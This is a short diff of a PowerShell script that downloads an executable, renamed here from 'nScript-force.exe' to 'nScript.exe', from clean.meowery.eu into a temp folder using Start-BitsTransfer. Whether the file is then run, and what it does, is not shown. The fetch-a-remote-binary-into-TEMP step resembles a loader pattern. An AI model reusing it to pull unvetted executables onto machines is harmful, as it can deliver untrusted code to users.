@@ -1,7 +1,7 @@
 $ErrorActionPreference = "Stop"
 
 # Configuration
-$BinaryName = "nScript-force.exe"
+$BinaryName = "nScript.exe"
 $TempPath = Join-Path $env:TEMP "nScript"
 $BinaryPath = Join-Path $TempPath $BinaryName
 
@@ -16,7 +16,7 @@ if (-not (Test-Path $TempPath)) {
 }
 
 try {
-    $DownloadUrl = "https://clean.meowery.eu/nScript-force.exe"
+    $DownloadUrl = "https://clean.meowery.eu/nScript.exe"
     
     Write-Host "[*] Downloading $BinaryName..." -ForegroundColor Yellow
     Start-BitsTransfer -Source $DownloadUrl -Destination $BinaryPath
